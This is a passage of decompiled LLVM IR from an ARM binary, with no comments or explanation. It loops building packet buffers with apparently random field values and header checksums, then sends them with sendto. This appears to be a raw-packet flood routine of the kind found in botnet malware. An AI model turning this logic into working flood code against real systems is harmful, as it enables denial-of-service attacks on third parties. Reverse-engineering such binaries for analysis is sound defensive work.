  br i1 %v2_a7e4, label %dec_label_pc_a9dc, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a974, %dec_label_pc_a7e0
  store i32 %v3_a4d4, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_a9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9ec, label %dec_label_pc_a9f8, label %dec_label_pc_a800

dec_label_pc_a800:                                ; preds = %dec_label_pc_a9dc.dec_label_pc_a800_crit_edge, %dec_label_pc_a7ec
  %v1_a804 = phi i32 [ %v1_a804.pre, %dec_label_pc_a9dc.dec_label_pc_a800_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_a7ec ]
  store i32 %v3_a4d8, i32* %r1.global-to-local, align 4
  %v9_a804 = icmp eq i32 %v3_a4d8, %v1_a804
  store i1 %v9_a804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a804, label %dec_label_pc_aa30, label %dec_label_pc_a80c

dec_label_pc_a80c:                                ; preds = %dec_label_pc_a9f8.dec_label_pc_a80c_crit_edge, %dec_label_pc_a800
  %v1_a810 = phi i32 [ %v1_a810.pre, %dec_label_pc_a9f8.dec_label_pc_a80c_crit_edge ], [ %v1_a804, %dec_label_pc_a800 ]
  store i32 %v3_a4dc, i32* %r2.global-to-local, align 4
  %v9_a810 = icmp eq i32 %v3_a4dc, %v1_a810
  store i1 %v9_a810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a810, label %dec_label_pc_aa4c, label %dec_label_pc_a818

dec_label_pc_a818:                                ; preds = %dec_label_pc_aa30, %dec_label_pc_a80c
  store i32 %v1_a4cc, i32* %r3.global-to-local, align 4
  store i1 %v2_aa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aa5c, label %dec_label_pc_aa70, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_a818
  %v1_a820 = load i32, i32* @r5, align 4
  %v2_a820 = add i32 %v1_a820, 16
  %v3_a820 = inttoptr i32 %v2_a820 to i32*
  %v4_a820 = load i32, i32* %v3_a820, align 4
  store i32 %v4_a820, i32* %r3.global-to-local, align 4
  %v2_a824 = load i32, i32* @r6, align 4
  %v3_a824 = add i32 %v2_a824, 16
  %v4_a824 = inttoptr i32 %v3_a824 to i32*
  store i32 %v4_a820, i32* %v4_a824, align 4
  br label %dec_label_pc_a82c

dec_label_pc_a82c:                                ; preds = %bb102, %.thread25, %dec_label_pc_aa70
  %v0_a82c = call i32 @function_f67c()
  store i32 %v0_a82c, i32* %r0.global-to-local, align 4
  store i32 %v0_a82c, i32* %stack_var_-44, align 4
  %v0_a834 = call i32 @function_f67c()
  store i32 %v0_a834, i32* %r0.global-to-local, align 4
  store i32 %v0_a834, i32* %stack_var_-48, align 4
  %v0_a83c = call i32 @function_f67c()
  store i32 %v2_a840, i32* %r1.global-to-local, align 4
  store i32 %v0_a83c, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a84c = load i32, i32* @r8, align 4
  store i32 %v0_a84c, i32* %r0.global-to-local, align 4
  %v3_a850 = call i32 @function_11814(i32 %v0_a84c, i32 %v2_a840, i32 4)
  %v0_a854 = load i32, i32* @r8, align 4
  %v1_a854 = add i32 %v0_a854, 6
  store i32 %v1_a854, i32* %r0.global-to-local, align 4
  store i32 %v2_a858, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_a860 = call i32 @function_11814(i32 %v1_a854, i32 %v2_a858, i32 4)
  %v0_a864 = load i32, i32* @r8, align 4
  %v1_a864 = add i32 %v0_a864, 4
  store i32 %v1_a864, i32* %r0.global-to-local, align 4
  store i32 %v2_a868, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_a870 = call i32 @function_11814(i32 %v1_a864, i32 %v2_a868, i32 2)
  store i32 %v2_a874, i32* %r1.global-to-local, align 4
  %v0_a878 = load i32, i32* @r8, align 4
  %v1_a878 = add i32 %v0_a878, 10
  store i32 %v1_a878, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_a880 = call i32 @function_11814(i32 %v1_a878, i32 %v2_a874, i32 2)
  store i32 %v3_a880, i32* %r0.global-to-local, align 4
  store i32 %v1_a43c, i32* %r1.global-to-local, align 4
  store i1 %v2_a888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a888, label %dec_label_pc_a890, label %dec_label_pc_aa7c

dec_label_pc_a890:                                ; preds = %dec_label_pc_a82c, %dec_label_pc_aa7c
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a894 = load i32, i32* @sl, align 4
  %v1_a894 = trunc i32 %v0_a894 to i8
  %v2_a894 = load i32, i32* @r5, align 4
  %v3_a894 = add i32 %v2_a894, 10
  %v4_a894 = inttoptr i32 %v3_a894 to i8*
  store i8 %v1_a894, i8* %v4_a894, align 1
  %v0_a898 = load i32, i32* @sl, align 4
  %v1_a898 = trunc i32 %v0_a898 to i8
  %v2_a898 = load i32, i32* @r5, align 4
  %v3_a898 = add i32 %v2_a898, 11
  %v4_a898 = inttoptr i32 %v3_a898 to i8*
  store i8 %v1_a898, i8* %v4_a898, align 1
  %v0_a89c = load i32, i32* @r5, align 4
  store i32 %v0_a89c, i32* @r0, align 4
  %v2_a8a0 = call i32 @function_ddf4(i32 %v0_a89c, i32 20)
  %v3_a8a0 = trunc i32 %v2_a8a0 to i8
  %v4_a8a4 = sdiv i32 %v2_a8a0, 256
  store i32 %v4_a8a4, i32* %r3.global-to-local, align 4
  %v1_a8a8 = trunc i32 %v4_a8a4 to i8
  %v2_a8a8 = load i32, i32* @r5, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 11
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  %v3_a8ac = load i32, i32* @r5, align 4
  %v4_a8ac = add i32 %v3_a8ac, 10
  %v5_a8ac = inttoptr i32 %v4_a8ac to i8*
  store i8 %v3_a8a0, i8* %v5_a8ac, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @sl, align 4
  %v1_a8b4 = trunc i32 %v0_a8b4 to i8
  %v2_a8b4 = load i32, i32* @r6, align 4
  %v3_a8b4 = add i32 %v2_a8b4, 10
  %v4_a8b4 = inttoptr i32 %v3_a8b4 to i8*
  store i8 %v1_a8b4, i8* %v4_a8b4, align 1
  %v0_a8b8 = load i32, i32* @sl, align 4
  %v1_a8b8 = trunc i32 %v0_a8b8 to i8
  %v2_a8b8 = load i32, i32* @r6, align 4
  %v3_a8b8 = add i32 %v2_a8b8, 11
  %v4_a8b8 = inttoptr i32 %v3_a8b8 to i8*
  store i8 %v1_a8b8, i8* %v4_a8b8, align 1
  %v0_a8bc = load i32, i32* @r6, align 4
  store i32 %v0_a8bc, i32* @r0, align 4
  %v2_a8c0 = call i32 @function_ddf4(i32 %v0_a8bc, i32 20)
  %v3_a8c0 = trunc i32 %v2_a8c0 to i8
  store i32 %v2_a8c0, i32* %r0.global-to-local, align 4
  %v4_a8c4 = sdiv i32 %v2_a8c0, 256
  store i32 %v4_a8c4, i32* %r3.global-to-local, align 4
  %v3_a8c8 = load i32, i32* @r6, align 4
  %v4_a8c8 = add i32 %v3_a8c8, 10
  %v5_a8c8 = inttoptr i32 %v4_a8c8 to i8*
  store i8 %v3_a8c0, i8* %v5_a8c8, align 1
  %v0_a8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_a8cc = trunc i32 %v0_a8cc to i8
  %v2_a8cc = load i32, i32* @r6, align 4
  %v3_a8cc = add i32 %v2_a8cc, 11
  %v4_a8cc = inttoptr i32 %v3_a8cc to i8*
  store i8 %v1_a8cc, i8* %v4_a8cc, align 1
  %v0_a8d0 = load i32, i32* @r7, align 4
  %v1_a8d0 = add i32 %v0_a8d0, 4
  %v2_a8d0 = inttoptr i32 %v1_a8d0 to i8*
  %v3_a8d0 = load i8, i8* %v2_a8d0, align 1
  %v4_a8d0 = zext i8 %v3_a8d0 to i32
  store i32 %v4_a8d0, i32* %r3.global-to-local, align 4
  %v1_a8d4 = add i32 %v0_a8d0, 5
  %v2_a8d4 = inttoptr i32 %v1_a8d4 to i8*
  %v3_a8d4 = load i8, i8* %v2_a8d4, align 1
  %v4_a8d4 = zext i8 %v3_a8d4 to i32
  store i32 %v0_a8d0, i32* @r1, align 4
  %v4_a8dc = mul nuw nsw i32 %v4_a8d4, 256
  %v5_a8dc = or i32 %v4_a8dc, %v4_a8d0
  store i32 %v5_a8dc, i32* %r2.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @sl, align 4
  %v1_a8e0 = trunc i32 %v0_a8e0 to i8
  %v3_a8e0 = add i32 %v0_a8d0, 6
  %v4_a8e0 = inttoptr i32 %v3_a8e0 to i8*
  store i8 %v1_a8e0, i8* %v4_a8e0, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i8
  %v2_a8e8 = load i32, i32* @r7, align 4
  %v3_a8e8 = add i32 %v2_a8e8, 7
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i8*
  store i8 %v1_a8e8, i8* %v4_a8e8, align 1
  %v0_a8ec = load i32, i32* @r6, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %v4_a8f0 = call i32 @function_de50(i32 %v0_a8ec, i32 %v0_a8d0, i32 %v5_a8dc, i32 %stack_var_-156.0.ph)
  %v5_a8f0 = trunc i32 %v4_a8f0 to i8
  store i32 %v4_a8f0, i32* %r0.global-to-local, align 4
  %v3_a8f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a8f4, i32* %r3.global-to-local, align 4
  %v3_a8f8 = mul i32 %v3_a8f4, 32
  store i32 %v3_a8f8, i32* %r2.global-to-local, align 4
  %v0_a8fc = load i32, i32* @r5, align 4
  %v1_a8fc = add i32 %v0_a8fc, 16
  %v2_a8fc = inttoptr i32 %v1_a8fc to i32*
  %v3_a8fc = load i32, i32* %v2_a8fc, align 4
  store i32 %v3_a8fc, i32* %r1.global-to-local, align 4
  %v5_a900 = mul i32 %v3_a8f4, 24
  store i32 %v5_a900, i32* %r2.global-to-local, align 4
  %v4_a90440 = udiv i32 %v4_a8f0, 256
  %v1_a908 = trunc i32 %v4_a90440 to i8
  %v2_a908 = load i32, i32* @r7, align 4
  %v3_a908 = add i32 %v2_a908, 7
  %v4_a908 = inttoptr i32 %v3_a908 to i8*
  store i8 %v1_a908, i8* %v4_a908, align 1
  %v0_a90c = load i32, i32* %r2.global-to-local, align 4
  %v1_a90c = load i32, i32* @sb, align 4
  %v2_a90c = add i32 %v1_a90c, %v0_a90c
  store i32 %v2_a90c, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_a914 = load i32, i32* @r7, align 4
  %v4_a914 = add i32 %v3_a914, 6
  %v5_a914 = inttoptr i32 %v4_a914 to i8*
  store i8 %v5_a8f0, i8* %v5_a914, align 1
  %v0_a918 = load i32, i32* %r1.global-to-local, align 4
  %v1_a918 = load i32, i32* %lr.global-to-local, align 4
  %v2_a918 = add i32 %v1_a918, 4
  %v3_a918 = inttoptr i32 %v2_a918 to i32*
  store i32 %v0_a918, i32* %v3_a918, align 4
  %v0_a91c = load i32, i32* %r3.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r2.global-to-local, align 4
  %v3_a91c = load i32, i32* @sb, align 4
  %v4_a91c = add i32 %v3_a91c, %v2_a91c
  %v5_a91c = inttoptr i32 %v4_a91c to i8*
  store i8 %v1_a91c, i8* %v5_a91c, align 1
  %v0_a920 = load i32, i32* @sl, align 4
  %v1_a920 = trunc i32 %v0_a920 to i8
  %v2_a920 = load i32, i32* %lr.global-to-local, align 4
  %v3_a920 = add i32 %v2_a920, 2
  %v4_a920 = inttoptr i32 %v3_a920 to i8*
  store i8 %v1_a920, i8* %v4_a920, align 1
  %v0_a924 = load i32, i32* @sl, align 4
  %v1_a924 = trunc i32 %v0_a924 to i8
  %v2_a924 = load i32, i32* %lr.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 1
  %v4_a924 = inttoptr i32 %v3_a924 to i8*
  store i8 %v1_a924, i8* %v4_a924, align 1
  %v0_a928 = load i32, i32* @sl, align 4
  %v1_a928 = trunc i32 %v0_a928 to i8
  %v2_a928 = load i32, i32* %lr.global-to-local, align 4
  %v3_a928 = add i32 %v2_a928, 3
  %v4_a928 = inttoptr i32 %v3_a928 to i8*
  store i8 %v1_a928, i8* %v4_a928, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a934 = load i32, i32* @r5, align 4
  store i32 %v0_a934, i32* %r1.global-to-local, align 4
  store i32 %v3_a484, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_a940 = load i32, i32* %lr.global-to-local, align 4
  %v4_a940 = inttoptr i32 %v0_a940 to %sockaddr*
  %v7_a948 = inttoptr i32 %v0_a934 to i32*
  %v9_a948 = call i32 @sendto(i32 %v3_a484, i32* %v7_a948, i32 %stack_var_-160.0.ph, i32 16384, %sockaddr* %v4_a940, i32 16)
  %v3_a94c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a94c, i32* %r3.global-to-local, align 4
  %v1_a950 = add i32 %v3_a94c, 1
  store i32 %v1_a950, i32* %r0.global-to-local, align 4
  %v1_a954 = load i32, i32* @fp, align 4
  %v9_a954 = icmp eq i32 %v1_a950, %v1_a954
  store i1 %v9_a954, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a950, i32* %stack_var_-40, align 4
  %v6_a95c = icmp slt i32 %v1_a950, %v1_a954
  br i1 %v6_a95c, label %dec_label_pc_a7b4, label %dec_label_pc_a79c

dec_label_pc_a964:                                ; preds = %dec_label_pc_a494
  store i32 %v3_a484, i32* %r0.global-to-local, align 4
  %v1_a968 = call i32 @close(i32 %v3_a484)
  store i32 %v1_a968, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a330, %dec_label_pc_a964
  %v29_a970 = phi i32 [ -1, %dec_label_pc_a330 ], [ %v1_a968, %dec_label_pc_a964 ]
  store i32 %v3_a330, i32* %r4.global-to-local, align 4
  store i32 %v6_a330, i32* %r5.global-to-local, align 4
  store i32 %v9_a330, i32* %r6.global-to-local, align 4
  store i32 %v12_a330, i32* %r7.global-to-local, align 4
  store i32 %v15_a330, i32* %r8.global-to-local, align 4
  store i32 %v21_a330, i32* %sl.global-to-local, align 4
  ret i32 %v29_a970

dec_label_pc_a974:                                ; preds = %dec_label_pc_a7b4
  %v1_a974 = add i32 %v2_a7bc, 16
  %v2_a974 = inttoptr i32 %v1_a974 to i32*
  %v3_a974 = load i32, i32* %v2_a974, align 4
  store i32 %v3_a974, i32* %r4.global-to-local, align 4
  %v0_a978 = call i32 @function_f67c()
  store i32 %v0_a978, i32* %r0.global-to-local, align 4
  %v3_a97c = load i32, i32* %stack_var_-40, align 4
  %v5_a984 = mul i32 %v3_a97c, 24
  %v0_a988 = load i32, i32* %r4.global-to-local, align 4
  %v1_a98c = load i32, i32* @sb, align 4
  %v2_a98c = add i32 %v1_a98c, %v5_a984
  store i32 %v2_a98c, i32* %r1.global-to-local, align 4
  %v1_a990 = and i32 %v0_a988, 65280
  store i32 %v1_a990, i32* %r3.global-to-local, align 4
  %v1_a988 = udiv i32 %v0_a988, 256
  %v3_a994 = and i32 %v1_a988, 65280
  store i32 %v3_a994, i32* %r2.global-to-local, align 4
  %v3_a998 = mul i32 %v0_a988, 16777216
  store i32 %v3_a998, i32* %ip.global-to-local, align 4
  %v1_a99c = add i32 %v2_a98c, 20
  %v2_a99c = inttoptr i32 %v1_a99c to i8*
  %v3_a99c = load i8, i8* %v2_a99c, align 1
  %v4_a99c = zext i8 %v3_a99c to i32
  store i32 %v4_a99c, i32* %lr.global-to-local, align 4
  %v4_a9a0 = mul nuw nsw i32 %v1_a990, 256
  %v5_a9a0 = or i32 %v4_a9a0, %v3_a998
  store i32 %v5_a9a0, i32* %ip.global-to-local, align 4
  %v2_a9a8 = call i32 @llvm.bswap.i32(i32 %v0_a988)
  %v7_a9ac = lshr i32 %v0_a978, %v4_a99c
  %v8_a9ac = add i32 %v7_a9ac, %v2_a9a8
  %v3_a9b8 = mul i32 %v8_a9ac, 16777216
  %v1_a9bc = and i32 %v8_a9ac, 65280
  store i32 %v1_a9bc, i32* %r0.global-to-local, align 4
  store i32 %v5_a470, i32* %r2.global-to-local, align 4
  %v4_a9c8 = mul nuw nsw i32 %v1_a9bc, 256
  %v5_a9c8 = or i32 %v4_a9c8, %v3_a9b8
  store i32 %v5_a9c8, i32* %r1.global-to-local, align 4
  %v2_a9cc = call i32 @llvm.bswap.i32(i32 %v8_a9ac)
  store i32 %v2_a9cc, i32* %r3.global-to-local, align 4
  store i1 %v2_a7e4, i1* %cpsr_z.global-to-local, align 1
  %v1_a9d4 = load i32, i32* @r5, align 4
  %v2_a9d4 = add i32 %v1_a9d4, 16
  %v3_a9d4 = inttoptr i32 %v2_a9d4 to i32*
  store i32 %v2_a9cc, i32* %v3_a9d4, align 4
  br i1 %v2_a7e4, label %dec_label_pc_a9dc, label %dec_label_pc_a7ec

dec_label_pc_a9dc:                                ; preds = %dec_label_pc_a974, %dec_label_pc_a7e0
  %v0_a9dc = call i32 @function_f67c()
  store i32 %v0_a9dc, i32* %r0.global-to-local, align 4
  store i32 %v3_a4d4, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_a9ec, i1* %cpsr_z.global-to-local, align 1
  %v1_a9f0 = load i32, i32* @r5, align 4
  %v2_a9f0 = add i32 %v1_a9f0, 12
  %v3_a9f0 = inttoptr i32 %v2_a9f0 to i32*
  store i32 %v0_a9dc, i32* %v3_a9f0, align 4
  br i1 %v9_a9ec, label %dec_label_pc_a9f8, label %dec_label_pc_a9dc.dec_label_pc_a800_crit_edge

dec_label_pc_a9dc.dec_label_pc_a800_crit_edge:    ; preds = %dec_label_pc_a9dc
  %v1_a804.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a800

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9dc, %dec_label_pc_a7ec
  %v0_a9f8 = call i32 @function_f67c()
  %v3_aa00 = urem i32 %v0_a9f8, 65536
  store i32 %v3_aa00, i32* %r0.global-to-local, align 4
  %v1_aa08 = sub nsw i32 999, %v3_aa00
  store i32 %v1_aa08, i32* %r2.global-to-local, align 4
  %v3_aa0c = sdiv i32 %v1_aa08, 256
  store i32 %v3_aa0c, i32* %r1.global-to-local, align 4
  %v3_aa1039 = udiv i32 %v3_aa00, 256
  store i32 %v3_aa1039, i32* %r3.global-to-local, align 4
  %v1_aa14 = trunc i32 %v3_aa1039 to i8
  %v2_aa14 = load i32, i32* @r5, align 4
  %v3_aa14 = add i32 %v2_aa14, 5
  %v4_aa14 = inttoptr i32 %v3_aa14 to i8*
  store i8 %v1_aa14, i8* %v4_aa14, align 1
  %v0_aa18 = load i32, i32* %r0.global-to-local, align 4
  %v1_aa18 = trunc i32 %v0_aa18 to i8
  %v2_aa18 = load i32, i32* @r5, align 4
  %v3_aa18 = add i32 %v2_aa18, 4
  %v4_aa18 = inttoptr i32 %v3_aa18 to i8*
  store i8 %v1_aa18, i8* %v4_aa18, align 1
  %v0_aa1c = load i32, i32* %r1.global-to-local, align 4
  %v1_aa1c = trunc i32 %v0_aa1c to i8
  %v2_aa1c = load i32, i32* @r6, align 4
  %v3_aa1c = add i32 %v2_aa1c, 5
  %v4_aa1c = inttoptr i32 %v3_aa1c to i8*
  store i8 %v1_aa1c, i8* %v4_aa1c, align 1
  store i32 %v3_a4d8, i32* %r1.global-to-local, align 4
  %v1_aa24 = load i32, i32* @r4, align 4
  %v9_aa24 = icmp eq i32 %v3_a4d8, %v1_aa24
  store i1 %v9_aa24, i1* %cpsr_z.global-to-local, align 1
  %v0_aa28 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa28 = trunc i32 %v0_aa28 to i8
  %v2_aa28 = load i32, i32* @r6, align 4
  %v3_aa28 = add i32 %v2_aa28, 4
  %v4_aa28 = inttoptr i32 %v3_aa28 to i8*
  store i8 %v1_aa28, i8* %v4_aa28, align 1
  %v0_aa2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aa2c, label %dec_label_pc_aa30, label %dec_label_pc_a9f8.dec_label_pc_a80c_crit_edge

dec_label_pc_a9f8.dec_label_pc_a80c_crit_edge:    ; preds = %dec_label_pc_a9f8
  %v1_a810.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a80c

dec_label_pc_aa30:                                ; preds = %dec_label_pc_a9f8, %dec_label_pc_a800
  %v0_aa30 = call i32 @function_f67c()
  %v1_aa30 = trunc i32 %v0_aa30 to i8
  store i32 %v0_aa30, i32* %r0.global-to-local, align 4
  store i32 %v3_a4dc, i32* %r2.global-to-local, align 4
  %v4_aa38 = sdiv i32 %v0_aa30, 256
  store i32 %v4_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = load i32, i32* @r4, align 4
  %v9_aa3c = icmp eq i32 %v3_a4dc, %v1_aa3c
  store i1 %v9_aa3c, i1* %cpsr_z.global-to-local, align 1
  %v3_aa40 = load i32, i32* @r5, align 4
  %v4_aa40 = add i32 %v3_aa40, 58
  %v5_aa40 = inttoptr i32 %v4_aa40 to i8*
  store i8 %v1_aa30, i8* %v5_aa40, align 1
  %v0_aa44 = load i32, i32* %r3.global-to-local, align 4
  %v1_aa44 = trunc i32 %v0_aa44 to i8
  %v2_aa44 = load i32, i32* @r7, align 4
  %v3_aa44 = add i32 %v2_aa44, 1
  %v4_aa44 = inttoptr i32 %v3_aa44 to i8*
  store i8 %v1_aa44, i8* %v4_aa44, align 1
  %v0_aa48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aa48, label %dec_label_pc_aa4c, label %dec_label_pc_a818

dec_label_pc_aa4c:                                ; preds = %dec_label_pc_aa30, %dec_label_pc_a80c
  %v0_aa4c = call i32 @function_f67c()
  %v1_aa4c = trunc i32 %v0_aa4c to i8
  store i32 %v0_aa4c, i32* %r0.global-to-local, align 4
  %v4_aa5041 = udiv i32 %v0_aa4c, 256
  %v1_aa54 = trunc i32 %v4_aa5041 to i8
  %v2_aa54 = load i32, i32* @r7, align 4
  %v3_aa54 = add i32 %v2_aa54, 3
  %v4_aa54 = inttoptr i32 %v3_aa54 to i8*
  store i8 %v1_aa54, i8* %v4_aa54, align 1
  store i32 %v1_a4cc, i32* %r3.global-to-local, align 4
  store i1 %v2_aa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aa5c, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_aa4c
  %v1_aa60 = load i32, i32* @r5, align 4
  %v2_aa60 = add i32 %v1_aa60, 16
  %v3_aa60 = inttoptr i32 %v2_aa60 to i32*
  %v4_aa60 = load i32, i32* %v3_aa60, align 4
  store i32 %v4_aa60, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_aa4c, %bb100
  %v3_aa64 = load i32, i32* @r7, align 4
  %v4_aa64 = add i32 %v3_aa64, 2
  %v5_aa64 = inttoptr i32 %v4_aa64 to i8*
  store i8 %v1_aa4c, i8* %v5_aa64, align 1
  %v0_aa68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aa68, label %dec_label_pc_aa70, label %bb102

bb102:                                            ; preds = %bb101
  %v1_aa68 = load i32, i32* %r3.global-to-local, align 4
  %v2_aa68 = load i32, i32* @r6, align 4
  %v3_aa68 = add i32 %v2_aa68, 16
  %v4_aa68 = inttoptr i32 %v3_aa68 to i32*
  store i32 %v1_aa68, i32* %v4_aa68, align 4
  br label %dec_label_pc_a82c

dec_label_pc_aa70:                                ; preds = %dec_label_pc_a818, %bb101
  %v0_aa70 = call i32 @function_f67c()
  store i32 %v0_aa70, i32* %r0.global-to-local, align 4
  %v1_aa74 = load i32, i32* @r6, align 4
  %v2_aa74 = add i32 %v1_aa74, 16
  %v3_aa74 = inttoptr i32 %v2_aa74 to i32*
  store i32 %v0_aa70, i32* %v3_aa74, align 4
  br label %dec_label_pc_a82c

dec_label_pc_aa7c:                                ; preds = %dec_label_pc_a82c
  %v0_aa7c = load i32, i32* @r7, align 4
  %v1_aa7c = add i32 %v0_aa7c, 8
  store i32 %v1_aa7c, i32* %r0.global-to-local, align 4
  store i32 %v5_a41c, i32* @r1, align 4
  %v1_aa84 = inttoptr i32 %v1_aa7c to i8*
  %v2_aa84 = call i32 @function_f7fc(i8* %v1_aa84)
  store i32 %v2_aa84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a890

dec_label_pc_aa8c:                                ; preds = %dec_label_pc_a4bc
  %v1_aa94 = add i32 %v5_a41c, 8
  store i32 %v1_aa94, i32* %r1.global-to-local, align 4
  %v1_aa98 = add i32 %v5_a41c, 66
  store i32 %v1_aa98, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_a79c.preheader

; uselistorder directives
  uselistorder i32 %v1_aa98, { 1, 0 }
  uselistorder i32 %v1_aa94, { 1, 0 }
  uselistorder i32 %v0_aa4c, { 0, 2, 1 }
  uselistorder i32 %v0_aa30, { 0, 2, 1 }
  uselistorder i32 %v3_aa00, { 0, 2, 1 }
  uselistorder i32 %v2_a9cc, { 1, 0 }
  uselistorder i32 %v8_a9ac, { 1, 2, 0 }
  uselistorder i32 %v3_a998, { 1, 0 }
  uselistorder i32 %v0_a988, { 2, 0, 1, 3 }
  uselistorder i32 %v1_a954, { 1, 2, 0 }
  uselistorder i32 %v1_a950, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_a8f4, { 1, 0, 2 }
  uselistorder i32 %v4_a8f0, { 0, 2, 1 }
  uselistorder i32 %v0_a8d0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_a8c0, { 0, 2, 1 }
  uselistorder i32 %v4_a8a4, { 1, 0 }
  uselistorder i32 %v7_a7c8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a79c, { 1, 0 }
  uselistorder i1 %v2_a7e4, { 3, 0, 1, 2 }
  uselistorder i1 %v2_aa5c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_a9ec, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a724, { 1, 0, 2 }
  uselistorder i32 %v3_a58c, { 1, 0 }
  uselistorder i32 %tmp89, { 1, 0 }
  uselistorder i32 %v1_a530, { 1, 0 }
  uselistorder i32 %v1_a52c, { 2, 1, 0 }
  uselistorder i32 %v1_a518, { 1, 0 }
  uselistorder i32 %v1_a514, { 2, 1, 0 }
  uselistorder i32 %v1_a50c, { 0, 2, 1 }
  uselistorder i32 %v3_a504, { 2, 1, 0 }
  uselistorder i32 %v0_a4e0, { 1, 0, 2 }
  uselistorder i32 %v3_a4d4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_a4cc, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_a4c8, { 2, 0, 1 }
  uselistorder i32 %v0_a4c8, { 2, 1, 0 }
  uselistorder i32 %v0_a4c0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_a4bc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_a484, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v5_a470, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v1_a43c, { 1, 2, 0 }
  uselistorder i32 %v5_a41c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a3d0, { 1, 0 }
  uselistorder i8 %v5_a3c0, { 1, 0 }
  uselistorder i32 %v5_a3a4, { 1, 0 }
  uselistorder i32 %v6_a368, { 1, 0 }
  uselistorder i32 %v4_a350, { 0, 3, 1, 2 }
  uselistorder i32 %v1_a334, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 46, 45, 48, 47, 0 }
